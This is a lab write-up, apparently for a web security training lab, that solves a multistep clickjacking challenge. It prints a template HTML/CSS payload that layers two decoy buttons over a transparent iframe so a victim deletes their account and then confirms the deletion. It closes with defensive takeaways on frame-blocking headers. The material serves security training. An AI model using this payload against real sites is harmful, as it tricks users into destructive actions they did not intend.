# Clickjacking - Multistep clickjacking

## 📌 Lab Details
- **Title**: Multistep clickjacking
- **Difficulty**: Practitioner
- **Category**: Clickjacking
- **Lab URL**:

## 🔍 Summary
This lab demonstrates **bypassing a confirmation dialog anti-clickjacking defense** by using **two layered decoy elements (“Click me first” and “Click me next”)** to trick the victim into first clicking the “Delete account” button, then confirming deletion in the dialog.

## 🛠 Steps to Solve
1. Log in to the given account.
2. Inject the **mulit clickjacking** payload on the **Exploit** server:
   ```sh
   <style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
   </style>
   <div class="firstClick">Click me first</div>
   <div class="secondClick">Click me next</div>
   <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
   ```
3. Adjust the values of the template to align both `Click me first` and `Click me next` to the appropriate buttons.
4. Deliver exploit to the victim to complete the lab.

## 📖 Key Takeaways
- Uses **two precisely aligned decoy divs** to guide the victim’s sequential clicks on hidden buttons within a transparent iframe.
- Reinforces the need for `X-Frame-Options` or CSP `frame-ancestors` since visual confirmation dialogs alone do not stop clickjacking.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/7cbcbb2c-2e9c-4ca7-9442-45665fb9a1ae)
![image](https://github.com/user-attachments/assets/900e64d1-9c53-4dd7-bdf7-1591c27e64a6)
![image](https://github.com/user-attachments/assets/a5097b95-9336-4723-8f40-f00bcf5c039a)
![image](https://github.com/user-attachments/assets/8f418e16-94e4-4fe0-a595-d8fe2d32324c)
